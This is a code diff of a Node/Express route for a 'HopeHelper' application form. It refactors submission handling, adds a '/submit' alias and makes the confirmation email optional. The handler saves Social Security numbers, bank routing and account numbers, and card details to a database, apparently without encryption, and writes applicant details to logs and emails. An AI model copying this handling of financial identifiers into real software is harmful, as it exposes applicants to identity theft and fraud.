@@ -53,34 +53,16 @@ const adminAuth = async (req, res, next) => {
     }
 };
 
-// === Endpoint: receive form submission + Drive info ===
-router.post('/log', async (req, res) => {
+// === Endpoint: receive form submission & save application ===
+const handleApplicationSubmission = async (req, res) => {
     try {
         const formData = req.body;
-        console.log(`🚀 [API/LOG] Received submission for: ${formData.formData.firstName} ${formData.formData.lastName}`);
-
-        const emailBody = `
-            === HopeHelper: Process Completed ===
-            
-            Application for ${formData.formData.firstName} ${formData.formData.lastName} has been successfully processed and stored.
-            
-            Timestamp: ${new Date(formData.timestamp).toLocaleString()}
-            Drive Folder: ${formData.folder?.url || 'N/A'}
-            
-            Check the Admin Dashboard for full details.
-            `;
-
-        console.log('📧 Attempting to send confirmation email...');
-        await transporter.sendMail({
-            from: process.env.EMAIL_USER,
-            to: process.env.EMAIL_USER,
-            subject: `✅ Application Processed: ${formData.formData.firstName} ${formData.formData.lastName}`,
-            text: emailBody
-        });
-        console.log('✅ Confirmation email sent');
+        console.log(`🚀 [API/SUBMIT] Received submission for: ${formData.formData?.firstName} ${formData.formData?.lastName}`);
 
         console.log('🗄️ Starting database transaction...');
         const connection = await pool.getConnection();
+        let applicationId;
+
         try {
             await connection.beginTransaction();
             console.log('🗄️ Inserting into applications table...');
@@ -92,19 +74,19 @@ router.post('/log', async (req, res) => {
                     drive_folder_id, drive_folder_url
                 ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                 [
-                    formData.formData.firstName, formData.formData.lastName, formData.formData.dateOfBirth,
-                    formData.formData.socialSecurityNumber, formData.formData.phoneNumber, formData.formData.email,
-                    formData.formData.currentAddress, formData.formData.city, formData.formData.state,
-                    formData.formData.zipCode, formData.formData.mailingAddress, formData.formData.bankName,
-                    formData.formData.accountType, formData.formData.routingNumber, formData.formData.accountNumber,
-                    formData.folder?.id, formData.folder?.url
+                    formData.formData?.firstName, formData.formData?.lastName, formData.formData?.dateOfBirth,
+                    formData.formData?.socialSecurityNumber, formData.formData?.phoneNumber, formData.formData?.email,
+                    formData.formData?.currentAddress, formData.formData?.city, formData.formData?.state,
+                    formData.formData?.zipCode, formData.formData?.mailingAddress, formData.formData?.bankName,
+                    formData.formData?.accountType, formData.formData?.routingNumber, formData.formData?.accountNumber,
+                    formData.folder?.id || formData.folder?.name || '', formData.folder?.url || ''
                 ]
             );
 
-            const applicationId = appResult.insertId;
+            applicationId = appResult.insertId;
             console.log(`🗄️ Application ID generated: ${applicationId}`);
 
-            if (formData.formData.cards?.length > 0) {
+            if (formData.formData?.cards?.length > 0) {
                 console.log(`🗄️ Inserting ${formData.formData.cards.length} cards...`);
                 for (const card of formData.formData.cards) {
                     await connection.query(
@@ -128,16 +110,51 @@ router.post('/log', async (req, res) => {
         } catch (dbError) {
             await connection.rollback();
             console.error('❌ Database error during transaction:', dbError);
+            throw new Error(`Database error: ${dbError.message}`);
         } finally {
             connection.release();
         }
 
-        res.json({ success: true, message: 'Submission logged and emailed successfully' });
+        // Send email notification safely (does not abort submission if SMTP auth fails)
+        try {
+            if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
+                console.log('📧 Attempting to send confirmation email...');
+                const emailBody = `
+=== HopeHelper: Application Submitted ===
+
+Application #${applicationId} for ${formData.formData?.firstName} ${formData.formData?.lastName} has been successfully stored in the database.
+
+Timestamp: ${new Date(formData.timestamp).toLocaleString()}
+Phone: ${formData.formData?.phoneNumber || 'N/A'}
+Email: ${formData.formData?.email || 'N/A'}
+Uploaded Files: ${formData.files?.length || 0}
+
+Check the Admin Dashboard for full application details.
+                `;
+
+                await transporter.sendMail({
+                    from: process.env.EMAIL_USER,
+                    to: process.env.EMAIL_USER,
+                    subject: `✅ Application Processed: ${formData.formData?.firstName} ${formData.formData?.lastName}`,
+                    text: emailBody
+                });
+                console.log('✅ Confirmation email sent');
+            } else {
+                console.log('ℹ️ EMAIL_USER or EMAIL_PASS not configured, skipping email notification');
+            }
+        } catch (emailError) {
+            console.error('⚠️ Confirmation email failed (application still saved to database):', emailError.message);
+        }
+
+        res.json({ success: true, applicationId, message: 'Submission saved successfully' });
     } catch (error) {
         console.error('Submission error:', error);
         res.status(500).json({ success: false, error: error.message });
     }
-});
+};
+
+router.post('/log', handleApplicationSubmission);
+router.post('/submit', handleApplicationSubmission);
 
 // === Cloudinary Upload Route ===
 router.post('/upload', upload.single('file'), async (req, res) => {
